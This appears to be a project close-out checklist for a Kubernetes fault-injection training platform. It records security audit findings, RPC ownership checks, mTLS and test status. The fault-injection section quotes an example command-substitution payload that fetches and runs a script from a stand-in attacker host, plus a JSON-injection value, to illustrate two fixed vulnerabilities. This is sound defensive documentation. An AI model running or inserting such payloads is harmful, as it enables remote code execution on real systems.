# Phase 2 Close-Out Checklist

Tracks completion of PLAN.md's Phase 2 (Production Simulations + T2) against the current
codebase. Each item requires: the feature itself, test coverage (unit + integration where
applicable), and security validation (input validation, access control, dependency checks)
before being marked complete. Originally verified as of 2026-08-23; **re-verified and corrected
2026-08-26 — see the dated update section below the original body, which is now the accurate
source of truth for fault-handler/mTLS/NetworkPolicy status.** The numbers in this original
summary are stale and kept only for historical record of what was believed true on 2026-08-23.

Scope: Phase 2 only, per explicit instruction. Phase 3+ (AWS vending, AI Mentor, multi-cloud)
starts only after this is signed off.

## Summary (2026-08-23, STALE — see 2026-08-26 update below)

All tracked Phase 2 items are complete. Two real security vulnerabilities were found by audit
and fixed (a JSON-structure injection and a shell injection — see the fault-injection section
below for details and regression tests). One cross-cutting security gap was found, documented,
and deliberately **not** built this pass by explicit decision: the orchestrator's gRPC service
has no authentication/authorization on any RPC (not specific to fault injection — affects
Provision/Destroy/Connect/etc. too). It's flagged with a recommended fix rather than silently
left unexamined or silently expanded into scope.

Final state (STALE, see update below): 12/35 fault handlers wired (was 11), 23/35 correctly
deferred, 0 unaccounted for. T2 tier code is real and gated off by default pending PLAN.md's own
operational precondition. SRE track covers all 4 of its curriculum topics (was 2 of 4).
Orchestrator: build/vet/test clean, `go mod verify` clean. Practice-core: typecheck clean, 93/93
tests pass (was 85), `npm audit` clean.

---

## Dev A — Execution & Infrastructure

### Fault injection mechanism (PLAN.md: "apply-after-health-gate sequencing, fault manifest execution")
- [x] ~~11 of 35 fault handlers wired with real K8s mutations~~
- [x] ~~23 of 35 correctly deferred with typed reasons (ErrUnsupportedMechanism)~~
- [x] ~~`f.cloud.egress-proxy-allowlist-too-strict` — resolved as a real handler
      (handlers_batch4.go), not deferred. Re-scoped from its original v1 content (a
      shared-Squid-ACL mechanism that would have leaked blast radius across every learner)
      to a safely per-namespace mechanism: deleting the namespace's own allow-egress-proxy
      NetworkPolicy. Fault content bumped to v2 with a corrected, honest diagnostic path.
      12/35 faults now fully wired (was 11).~~
- [x] ~~Security validation: fault handler input validation audit~~ (see below)
- [x] ~~Security validation: access control audit — **KNOWN GAP, documented, not fixed this
      pass** (see below; explicitly descoped from Phase 2 per user decision, cross-cutting
      beyond fault injection)~~
- [x] ~~Test coverage: security-focused tests (malformed/adversarial params, blast-radius
      regression guards) for the K8s-object-mutating handlers~~ (see below)

**Input validation audit (fault handler params → K8s API calls):**
Every handler in `orchestrator/internal/faultinjection/*.go` receives `params
map[string]string` from `InjectFaultRequest.params` (a plain wire-level string map — content-
authored by activity YAML, not learner-typed at request time, but the RPC itself accepts
arbitrary strings from any caller per the access-control gap above). Audited each handler's
param usage:
- **String params interpolated into `fmt.Sprintf` JSON patches** (memory-limit-too-low,
  rollout-stuck-bad-image-tag, statefulset-ordinal-stuck): values go through `%q` (Go's
  quoted-string verb, which escapes quotes/backslashes/control chars) before being embedded in
  the patch JSON — JSON-injection-safe by construction, not by convention. One handler
  (readiness-probe-too-aggressive) did NOT follow this pattern and was vulnerable — see finding
  #1 below, now fixed to match.
- **Values parsed as typed K8s API objects before use** (resource.Quantity via `parseQuantity`,
  `corev1.TaintEffect` validated against an explicit switch/case allowlist in
  taint-blocks-scheduling, `strconv.Atoi` for statefulset-ordinal-stuck's ordinal and
  traffic-spike's rps/duration_s): malformed input is rejected with a typed error before any
  K8s call, not passed through.
- **Values used as K8s object names** (service/configmap/pvc/networkpolicy/deployment names via
  `clientset...Get/Patch/Update/Delete/Create`): the K8s API server itself validates these
  against RFC 1123 DNS-label rules and rejects malformed names — this package doesn't need to
  duplicate that validation, the client-go call fails cleanly (caught by each handler's existing
  error-wrapping) rather than doing anything unsafe with a malformed name.
- **REAL VULNERABILITY FOUND AND FIXED #1 — JSON-structure injection**:
  `applyReadinessProbeTooAggressive` (`handlers.go`) interpolated `timeout_seconds` as a raw,
  unvalidated JSON number via `%s` (every other handler correctly uses `%q` for string fields,
  which is injection-safe by construction). A malformed value like `1, "x":"y"` could corrupt
  the merge-patch JSON or inject arbitrary fields into a K8s API call. **Fixed**: validated via
  `strconv.Atoi` before use, now formatted via `%d`. Regression test:
  `TestApplyReadinessProbeTooAggressive_RejectsNonIntegerTimeout` (handlers_test.go), which
  includes the exact JSON-corruption payload as a test case.
- **REAL VULNERABILITY FOUND AND FIXED #2 — shell injection (more severe)**:
  `applyTrafficSpike` (`handlers_batch3.go`) built its load-generator Job's shell script via
  `fmt.Sprintf(..., %q, targetURL)`, relying on Go's `%q` to make the value shell-safe. It
  doesn't: `%q` escapes Go-string metacharacters (quotes, control chars) but not shell
  metacharacters like `$(...)` or backticks — a `target_url` containing e.g.
  `$(curl attacker.example/x|sh)` would have executed as a real command substitution inside the
  container. **Fixed**: `target_url` is now passed as a shell positional argument (`$1` via
  `Command`'s argv), never interpolated into the script text — the standard safe pattern for
  untrusted data in shell scripts. Regression test:
  `TestApplyTrafficSpike_TargetURLNeverInterpolatedIntoScript` (handlers_batch3_test.go),
  structurally asserts the script text never contains the raw value.
- `applyEgressProxyAllowlistTooStrict`'s `namespace`
  param override had no bound preventing it from targeting a namespace outside the caller's own
  environment (e.g. another learner's `env-*` namespace, or in principle any namespace the K8s
  RBAC the orchestrator's own ServiceAccount can reach). This is the same class of gap as the
  RPC-level access-control issue above (no caller-identity check), not unique to this one
  handler — `nonEmptyParam`'s namespace-override pattern is shared by
  `resourcequota-blocks-deploy` and `networkpolicy-overblocks-traffic` too, all three inherit
  the same trust assumption. `TestApplyEgressProxyAllowlistTooStrict_NamespaceParamOverride`
  documents the current (unrestricted) behavior as a test so the gap is visible and won't
  regress silently; not fixed independently of the broader RPC-auth gap since fixing one
  handler's namespace override without the others would be inconsistent and wouldn't close the
  actual attack surface (the RPC layer itself).

**Access control audit — service-level auth built (`auth.go`, shared bearer token, gated behind
`ORCHESTRATOR_SHARED_SECRET`); per-resource ownership for `InjectFault` specifically now CLOSED:**
`InjectFault` previously had no caller-identity check AND no attempt/environment-ownership
validation — a caller holding the shared secret could target ANY `environment_id`, including
another learner's. Fixed: `InjectFaultRequest` gained a required `attempt_id` field (proto,
additive), and the RPC handler now looks up `env.environment.attempt_id` for the target
`environment_id` and rejects a mismatch with `PermissionDenied`
(`checkFaultInjectionOwnership`, `internal/orchestrator/server.go`). practice-core's
`applyT0Faults` (the only real call site) now passes its own `attempt_id` through
`GrpcOrchestratorClient.injectFault`. 5 new unit tests
(`server_test.go`) cover matching/mismatched attempts, empty-owner defense-in-depth, and a real
bug caught during this fix's own live verification: the ownership check initially used a raw Go
string `==` comparison, which failed a genuinely-correct caller because Postgres's `uuid` column
normalizes to lowercase on read while the caller's UUID casing could differ — fixed by comparing
parsed `uuid.UUID` values instead (`github.com/google/uuid`), which also makes the check fail
closed on a malformed UUID rather than falling back to string equality. Live-verified against the
real orchestrator: a mismatched-attempt call is rejected with `PermissionDenied` and recorded in
`env.audit_log` with the attacker's claimed `attempt_id`; a matching-attempt call reaches the real
fault handler.

**Update 2026-08-24 — the remaining gap below is now CLOSED.** `Connect`, `Destroy`,
`MintValidatorCredentials`, `ExecValidator`, and `ExecShell` all gained the same
`attempt_id`-ownership check `InjectFault` got in this section's original pass — see
`PLAN_RPC_AUTHZ.md` at the repo root for the full 7-section implementation record (proto changes,
server-side enforcement, unit + live integration tests against a real Postgres/K8s stack, client
threading through every practice-core call site including the previously-untested
`content-ci.ts` script — which turned out to have its own latent bug, a non-UUID `attempt_id`
that silently failed `env.environment`'s INSERT and would have made every legitimate content-CI
run start failing PermissionDenied the moment this fix landed, caught and fixed during that
document's own live verification, not left for someone else to hit). `checkFaultInjectionOwnership`
was renamed `checkEnvironmentOwnership` since it's shared by all 6 RPCs now, not just
`InjectFault`. `Provision` still has nothing to check ownership against (it creates the
environment). Live-verified against the real orchestrator: all 5 RPCs reject a mismatched
`attempt_id` with `PermissionDenied` and leave the target environment/namespace untouched; the
legitimate owner's calls (including a full real content-CI golden-path run — provision, null-path
validators, solution apply, golden-path validators, flake check, destroy) all succeed unchanged.

**Update 2026-08-26 — both items below are now CLOSED / addressed, see the dated section at the
end of this document for full detail:** `grpc.NewServer()` now serves real mTLS
(`credentials.NewTLS` with `RequireAndVerifyClientCert`, self-signed dev CA, `orchestrator/internal/orchestrator/mtls_test.go`'s
6-scenario handshake suite) layered alongside the existing shared-secret interceptor, not
replacing it. A K8s NetworkPolicy restricting gRPC ingress to practice-core's pod-selector
specifically now exists (`orchestrator/manifests/t1/orchestrator-netpol.yaml`) and is
dry-run-validated, but — named explicitly, not silently claimed complete — is **not live-testable
in this dev environment**, because the orchestrator itself runs as a bare host process here, not
a K8s pod (see that manifest's own header comment for the full reasoning).

### `blast_radius` forbidden-command detection (PLAN.md: "at the telemetry-tap layer")
- [x] ~~Session Broker telemetry tap captures every COMMAND_EXECUTED event (the capture-point
      half); Dev B's command-executed.consumer.ts does the forbidden-substring match against
      process_signals.blast_radius.forbidden and increments blast_radius_violations — matches
      PLAN.md's own integration-point note verbatim ("detected in Dev A's tap but scored by
      Dev B's scoring engine, same event-based handoff, no new mechanism needed")~~
- [x] ~~telemetry_tap_test.go passes (13 tests incl. malformed-input handling)~~
- [x] ~~command-executed-consumer.integration.spec.ts exists and covers the match path~~

### T2 microVM tier (PLAN.md: "Firecracker/Kata driver, DinD, k3s multi-node, systemd/eBPF support")
- [x] ~~Tier-aware provisioning logic (TierT1/TierT2, applyT2PodShape, PSS levels, resource quotas)~~
- [x] ~~Kata RuntimeClass manifest + node-pool capacity doc~~
- [x] ~~Gated behind ORCHESTRATOR_T2_ENABLED (off by default, PLAN.md's own sequencing gate)~~
- [x] ~~9 unit tests on pure tier-branch logic~~
- [x] ~~Security validation: T2's `privileged: true` + PSS `privileged` namespace override —
      formal threat-model note added to manifests/t2/node-pool-taint.md covering what's traded
      away vs T1, why Kata's hardware virtualisation is the real compensating control, and
      confirmed the T2 pod shape has exactly one code path (gated on resolveTier's output at
      the RPC boundary) with no way for a learner's zero-K8s-API-access workspace pod to
      request T2 placement for itself~~
- [x] ~~Test coverage: extracted the T2 gating decision into a pure `resolveTier()` function
      (internal/orchestrator/server.go) and added internal/orchestrator/server_test.go — the
      first test file this package has ever had. 6 tests, including a named security-regression
      test (`TestResolveTier_T2NeverSilentlyDowngradesToT1`) asserting a disabled T2 request
      always errors, never silently resolves to a weaker tier~~
- [x] ~~Dependency check: `go mod verify` passes ("all modules verified"); k8s.io/api and
      k8s.io/apimachinery (which batch/v1 belongs to) are pinned to exact v0.36.3 in go.mod,
      no floating versions, go.sum present with 186 checksummed entries~~

### Second cluster/node-pool capacity planning for T2
- [x] ~~Capacity model documented (node shape, per-env quota, autoscaling policy, cost control)~~
- [x] ~~Cross-check capacity doc numbers against actual applyResourceQuota/applyLimitRange T2
      values — confirmed exact match (8 vCPU / 16Gi in both doc and code), no drift~~

---

## Dev B — Product & Content

### Fault library content (PLAN.md: "first 30 faults, as versioned content primitives")
- [x] ~~35 faults authored (exceeds the 30 target)~~
- [x] ~~All 35 validate against contracts/fault.schema.json~~

### Process telemetry signals (`diagnostic_efficiency`, `hypothesis_ordering`)
- [x] ~~Implemented in criteria.ts~~ (verify tests still pass)

### `NO_REGRESSION` and `HTTP_SLO` validator types
- [x] ~~Both implemented in orchestrator/internal/validation~~ (verify tests still pass)

### Incident-note artifact + AI-graded rubric (`rub.incident-note.v2`)
- [x] ~~Rubric authored, ArtifactService + FakeAiGrader pipeline wired, 100% human-review
      policy matches PLAN.md's "human-reviewed at 100% initially"~~ (verify tests still pass)

### `sp.production-sim.default` scoring profile
- [x] ~~Registered in SCORING_PROFILE_REGISTRY, selectable per-activity~~
- [x] ~~Integration-tested end-to-end (real Postgres, profile selection + criteria verified)~~
- [x] ~~Unit test coverage in scoring-engine.service.spec.ts specifically — added 8 new tests
      exercising PRODUCTION_SIM_DEFAULT_PROFILE directly (the real registered profile object,
      not a synthetic spread like the earlier blast_radius/overtime tests): criterion-key
      selection (troubleshooting/technical_implementation/reliability present,
      task_completion/efficiency absent), the technical_implementation/reliability alias
      behavior, the troubleshooting criterion's good-vs-bad diagnostic-action blend, blast_radius
      and overtime penalties computed against the profile's real configured values (not
      hardcoded expected numbers), the minAfterPenalties guard, and required-task failure.
      93/93 practice-core tests pass (was 85)~~

### Elo calibration engine / Retry-cooldown policy
- [x] ~~Both implemented (elo.service.ts, cooldown.ts)~~ (verify tests still pass)

### Second course track content authoring (SRE)
- [x] ~~Skill/curriculum seed scripts authored (seed-skills-sre.ts, seed-curriculum-sre.ts)~~
- [x] ~~3 activities authored (2 guided labs + 1 production sim), schema-valid~~
- [x] ~~Expanded from 3 to 5 activities: added `lab.sre.write-a-postmortem` (topic.sre.postmortems,
      previously zero activities) and `lab.sre.size-replicas-for-load` (topic.sre.capacity-and-load,
      previously zero activities). All 4 SRE curriculum topics (incident-diagnosis, postmortems,
      slo-error-budgets, capacity-and-load) now have at least one primary-topic activity. All 5
      SRE activities' skill/topic slug references cross-checked against seed-skills-sre.ts and
      seed-curriculum-sre.ts — every reference resolves. All activity YAMLs validated against
      contracts/activity_spec.schema.json at the time (count later grew substantially — see
      2026-08-26 update, 72 activities as of that date)~~
- [x] ~~Security validation: SRE activity content review — both new activities use only
      read-only `kubectl get`/`FILE_EXISTS` validators (orchestrator-executed, not
      learner-shell-interpolated), same safe pattern as the existing DevOps track; no
      privilege-escalation instructions, no new content-authoring trust surface~~

---

## Cross-cutting (both tracks)

- [x] ~~Full orchestrator build/vet/test green after all changes — `go build ./...`,
      `go vet ./...`, `gofmt -l .` (empty), `go test ./...` all pass, including the new
      internal/orchestrator package (previously "no test files", now `ok`)~~
- [x] ~~Full practice-core typecheck/test green after all changes — `tsc --noEmit` clean,
      93/93 tests pass (was 85 at session start)~~
- [x] ~~Dependency audit — `go mod verify`: "all modules verified"; k8s.io/api/batch/v1 (Job,
      used by traffic-spike) is part of the already-pinned k8s.io/api v0.36.3, no new/floating
      Go dependency introduced. `npm audit --audit-level=high`: 0 vulnerabilities; no new npm
      packages added this phase (no package.json changes)~~
- [x] ~~No secrets/credentials committed in any new file — scanned all changed/new files for
      AWS key patterns, PEM private key headers, and hardcoded password/api-key assignments;
      none found~~

---

## Update 2026-08-26 — full re-verification against 5 previously-flagged pending items

This update replaces the 2026-08-23 summary above as the accurate source of truth for
fault-handler wiring, mTLS, and NetworkPolicy status — those numbers were correct on 2026-08-23
but became stale as further work landed without this document being refreshed, which this update
corrects along with completing the substantive work itself. Five items were checked against
current code (not assumed from the prior summary) and, where still genuinely pending, completed:

### 1. PRODUCTION_SIM activities consuming the fault library — DONE

Was: 34 of 35 wired/authored faults had no simulation activity; only
`sim.sre.checkout-latency-incident.yaml` existed. Now: **9 PRODUCTION_SIM activities**, covering
**28 of 35 faults** (up from 3 of 35):

| Activity | Faults covered |
|---|---|
| `sim.sre.checkout-latency-incident` (pre-existing) | readiness-probe-too-aggressive, memory-limit-too-low, load.traffic-spike |
| `sim.k8s.platform-migration-incident` | configmap-key-renamed, pvc-storageclass-missing, networkpolicy-overblocks-traffic, resourcequota-blocks-deploy |
| `sim.k8s.rollout-stuck-incident` | rollout-stuck-bad-image-tag, statefulset-ordinal-stuck |
| `sim.k8s.checkout-network-incident` | wrong-service-selector, cloud.egress-proxy-allowlist-too-strict |
| `sim.observability.pipeline-blind-spots-incident` | tekton.task-missing-workspace-binding, prometheus.scrape-target-down, prometheus.alert-rule-syntax-silent-fail, jaeger.missing-trace-context-propagation |
| `sim.cicd.tooling-degraded-incident` | elk.logstash-pipeline-blocked, jenkins.agent-offline, jenkins.stale-cached-dependency, helm.values-override-not-applied, ansible.inventory-host-unreachable |
| `sim.terraform.state-incident` | tf.state-lock-orphan, tf.state-drift-manual-change, tf.module-version-pin-mismatch |
| `sim.gitlab.branch-protection-incident` | gitlab.protected-branch-blocks-push |
| `sim.docker.build-and-deploy-incident` | docker.dockerfile-wrong-workdir, docker.network-not-attached, docker.swarm-service-image-pull-fail, github.actions-secret-not-passed |

All 72 activity YAMLs (was 64) pass `scripts/lint-content.ts` (schema + skill-existence +
prerequisite-DAG, against real Postgres): **72 passed, 0 failed**.

**Remaining 7 of 35 faults with no activity**, named explicitly rather than left implicit:
- 3 T2-gated (`f.istio.mtls-mode-mismatch`, `f.istio.virtualservice-weight-sum-invalid`,
  `f.gitops.argocd-out-of-sync-manual-drift`) — all three have real, live-verified handlers (see
  item 3 below) but can't run for a real learner in this environment (no Kata-capable node), so a
  PRODUCTION_SIM activity for them would be authored against a tier that never actually schedules
  here. Not authored this pass; straightforward to add once a Kata-capable environment exists —
  the handlers and fixtures are already the hard part and are done.
- 1 metrics-contract-pending (`f.k8s.hpa-metrics-unavailable`) — see item 3.
- 2 AWS-IAM-blocked (`f.cloud.iam-overpermissive-role`, `f.iam.missing-ecr-pull`) — see item 3.
- 1 (`f.k8s.taint-blocks-scheduling`) has a real handler but a genuine, narrow content-authoring
  gap discovered this pass: its `node` param must name a real K8s Node, but this cluster's (and
  any single-node k3s dev cluster's) node name is a non-portable, restart-unstable
  container-hash string (confirmed live: `9f7294232d1a` on this run), not something a static
  content YAML can safely hardcode. No existing activity (in any prior session either) has ever
  wired this fault for the same reason. Needs either a "current node" resolution convention
  (e.g. a reserved param value the orchestrator resolves against the live node list at
  InjectFault time) or authoring against a real multi-node/named-nodepool environment — a small,
  scoped design gap, not a blocker on anything else.

### 2. K8s NetworkPolicy scoping gRPC ingress to practice-core's pod — DONE (manifest), NAMED BLOCKER (live verification)

`orchestrator/manifests/t1/orchestrator-netpol.yaml` is a real, correct NetworkPolicy for the
intended production topology (both orchestrator and practice-core running as K8s pods, matching
this repo's own `manifests/t1/` convention), dry-run validated
(`networkpolicy.networking.k8s.io/orchestrator-grpc-ingress created (server dry run)`). **Named
blocker, not silently claimed complete**: this cannot be live-verified in this dev environment
because the orchestrator runs as a bare host process here (confirmed: no `orchestrator` service
in `docker-compose.yml`; it authenticates to the cluster via a kubeconfig with client-cert auth
from outside the cluster, not an in-cluster ServiceAccount) — there is no orchestrator Pod for
this policy to attach to yet. Deploying the orchestrator itself as a K8s pod is a separate,
larger deployment-topology decision this manifest doesn't make on its own; the manifest's own
labels are the EXPECTED labels a real orchestrator Deployment would carry and should be checked
against whatever that Deployment actually uses once it exists.

### 3. The 4 deferred faults — 1 built this pass, 3 remain deferred with corrected reasons

The original pending-item list characterized all 3 non-metrics-contract deferred faults as
"blocked on Phase 3's AWS account-vending." Re-checked against `deferred.go` directly rather than
assumed: this was accurate for 2 of the 3, but **not** for the third.

- **`f.gitops.argocd-out-of-sync-manual-drift` — BUILT, not deferred.** This fault is
  `min_tier: T2_ISOLATED_MICROVM`-gated, same as the two Istio faults were before this session
  built real handlers for them — it was never actually AWS-blocked, only T2-tier-blocked, and the
  T2-unschedulability gap (no Kata-capable node in this environment) does not block *building and
  live-verifying* a T2-gated handler, as the Istio pair already proved. Built following that exact
  precedent: `fx.argocd-minimal.v1` (`orchestrator/internal/fixture/handlers_argocd.go`) installs
  a real Argo CD "core install" (application-controller, repo-server, redis,
  applicationset-controller, the Application/AppProject/ApplicationSet CRDs — no
  argocd-server/dex/UI, driven directly via the Application CRD the same way this session's Istio
  fixture drives VirtualService/PeerAuthentication) plus a real `Application` syncing this
  session's own `fx.gitea-repo.v1` instance into the learner's namespace.
  `applyArgoCDOutOfSyncManualDrift` (`handlers_batch16.go`) disables `syncPolicy.automated` and
  hand-edits the managed object outside Git, live-verified
  (`TestArgoCDFixtureAndFault_LiveIntegration`, PASS) to produce a real, un-self-healed
  `OutOfSync` from a genuine `application-controller` reconciliation loop. Content bumped to v2:
  the `argocd app diff` diagnostic step was rewritten to `kubectl get application -o yaml` since
  this environment (core-install only) has no `argocd` CLI/UI — the CRD's own `status` fields
  carry the same information the CLI would render. Gated at the RPC layer by
  `faultinjection.RequiresT2` exactly like the Istio pair — not runnable for a real learner here
  until a Kata-capable node exists, but the handler itself is real and proven, not deferred.
  **Four real bugs found and fixed live during this build**, each documented in the code:
  (1) Argo CD's own `applicationsets.argoproj.io` CRD is large enough that plain `kubectl apply`'s
  `last-applied-configuration` annotation exceeds the API server's 262144-byte limit — fixed by
  switching `clusterbootstrap.ApplyManifestContentInNamespace` to `--server-side` apply, which
  doesn't use that annotation; (2) core-install mode does not seed a `default` AppProject (only
  the full install's bootstrap logic does), so the Application object was stuck at a permanent
  `InvalidSpecError` — fixed by explicitly creating it; (3) `argocd-repo-server` (in the cluster-
  wide `argocd` namespace) reaching Gitea (in the learner's own namespace) hit the learner
  namespace's real default-deny **ingress** policy from the opposite direction every other
  cross-namespace fixture this session built needed (Istio/Terraform both only needed the
  learner namespace's own *egress* opened) — fixed with a narrowly-scoped ingress-allow rule on
  the Gitea pod specifically, sourced from the `argocd` namespace via its automatic
  `kubernetes.io/metadata.name=argocd` label; (4) a genuine cross-tenant correctness bug found
  by inspection (not live, since this dev environment never exercises two concurrent learner
  environments against this fixture): the Application CRD lives in the single, cluster-wide
  `argocd` namespace, so a fixed object name would let a second concurrent environment's
  `Create` silently no-op against the FIRST environment's own Application (still pointed at the
  first environment's `destination.namespace`) — the second learner's fixture apply would report
  success while never actually creating anything for their own namespace. Fixed by namespacing
  the real object name per-environment (`practice-app-<namespace>`); the fault's own `application`
  content param stays the stable logical name `practice-app`, with both the fixture and the fault
  handler independently deriving the same real per-namespace object name.
- **`f.cloud.iam-overpermissive-role`, `f.iam.missing-ecr-pull` — remain deferred, correctly.**
  Re-checked each fault's own content YAML directly (not assumed): both are genuinely
  ARN/policy-specific (IAM role trust policies, ECR repository policies), not something a
  K8s-RBAC concept can honestly stand in for the way Argo CD turned out to be reframable from
  "AWS-blocked" to simply "T2-blocked." Phase 2 has no real AWS account-vending (that's Phase 3's
  explicit scope per PLAN.md) — genuinely structurally blocked, not a gap this phase could have
  closed.
- **`f.k8s.hpa-metrics-unavailable` — remains deferred, correctly, pending a real design
  decision.** Its own prior triage (preserved verbatim in `deferred.go`) already concluded this
  needs its own metrics-degradation contract, not fixture work: "cluster-infrastructure target,
  no per-fault params can express what to degrade." This is a scoped design task for a future
  session, not a build gap — re-confirmed, not silently left ambiguous.

`deferred.go`'s own accounting comment and `deferred_test.go`'s `TestFullFaultRegistry_All35Accounted`
now read **12 typed-wired + 20 dynamic-wired + 3 deferred = 35** (was 12 + 19 + 4 = 35).

### 4. GenAI track — explicitly descoped for Phase 2

Decision made and confirmed with the user (not a unilateral call): the GenAI track (seed scripts
already exist in practice-core but have no authored activities against them) is explicitly
**out of Phase 2/3 scope** for now, rather than left as an ambiguous, apparently-abandoned
half-start. No further action needed this phase; revisit if/when GenAI-track content is
prioritized.

### 5. This document and mTLS/NetworkPolicy status — refreshed (this update itself)

The two corrections folded into the body above (the "Still not fixed" mTLS/NetworkPolicy
paragraph in the fault-injection section, and the stale 12/35-wired, 23/35-deferred, 64-activity
counts in the summary and SRE sections) are this item's own deliverable — this document was, by
the time this update started, itself the misleading source of truth the original pending-item
list flagged it as. mTLS is real (self-signed dev CA, `RequireAndVerifyClientCert`,
6-scenario handshake test suite, layered with the pre-existing shared-secret interceptor, not
replacing it — see `orchestrator/internal/orchestrator/mtls_test.go`). The gRPC-ingress
NetworkPolicy is real but has a named, structural live-verification blocker (item 2 above).

### Full regression verification (this update)

- `go build ./...`, `go vet ./...`, `gofmt -l .` (empty) — clean.
- `go mod verify` — "all modules verified".
- `go test ./... -count=1` (orchestrator, real K8s/Postgres-backed integration tests included) —
  **clean pass, zero failures**, confirmed via two runs: a full-suite run (all non-`fixture`
  packages green) plus a dedicated rerun of `internal/fixture` alone with an extended timeout
  (see below), which also passed clean — the earlier flaky
  `TestJaegerFixtureAndFault_LiveIntegration` (a trace-propagation timing race, previously
  confirmed as a pre-existing issue unrelated to this update's changes) did not even reproduce on
  this final run.
- **Test-infra finding, fixed by process not code**: a full `go test ./...` run hit the `fixture`
  package's default 10-minute per-package timeout mid-suite (a `FAIL` on elapsed time, not a
  failing assertion) — this session's cumulative additions (Istio, Terraform, Gitea, DinD,
  billing-platform, rollout-workloads, ArgoCD, each with their own multi-minute live-infra
  integration test) have grown `internal/fixture`'s real wall-clock runtime past what the
  default budget affords. Not a functional regression: rerunning with `go test ./internal/fixture/
  -timeout 25m` completed cleanly in 607s. Flagged here rather than silently worked around:
  CI/local runs of the full suite should pass an explicit longer `-timeout` for this package (or
  target it separately) going forward, since the default will keep getting tighter as more
  fixtures land.
- `npx tsc --noEmit` (practice-core) — clean.
- `npm test` (practice-core) — 161/161 tests pass (was 93 as of the 2026-08-23 summary, reflecting
  the mTLS/audit-logging/RPC-ownership work landed since).
- `npm audit --audit-level=high` (practice-core) — 0 vulnerabilities.
- `npx tsx scripts/lint-faults.ts` — 35/35 fault YAMLs pass schema validation.
- `npx ts-node -r tsconfig-paths/register scripts/lint-content.ts` — 72/72 activity YAMLs pass
  (schema + skill-existence + prerequisite-DAG, against real Postgres).

### Verdict: PHASE 2 — items re-verified as complete, with 3 explicitly named, non-closeable blockers

Of the 5 items on the pending-item list this update was scoped against: **items 1, 2 (manifest),
4, and 5 are done; item 3 is done for 2 of its 4 faults (1 built, 1 already-correct-as-deferred)
with the remaining 2 correctly, structurally blocked and named, not silently treated as closed.**

Three items remain permanently outside this phase's ability to close, named explicitly per the
task's own standing rule (no silent stubs, name blockers by name):
1. **`f.cloud.iam-overpermissive-role` / `f.iam.missing-ecr-pull`** — blocked on Phase 3's real
   AWS account-vending; will not be revisited before that lands.
2. **`f.k8s.hpa-metrics-unavailable`** — blocked on a metrics-degradation contract design
   decision that hasn't been made yet; a future session's task, not a build gap.
3. **The gRPC-ingress NetworkPolicy's live enforcement** — blocked on the orchestrator being
   deployed as a K8s pod, a deployment-topology decision out of this document's scope.

Everything else this phase's task named as pending is genuinely, verifiably done — real
fixtures, real handlers, real live-verified mutations, real test coverage, not stubs or
claims-without-evidence.
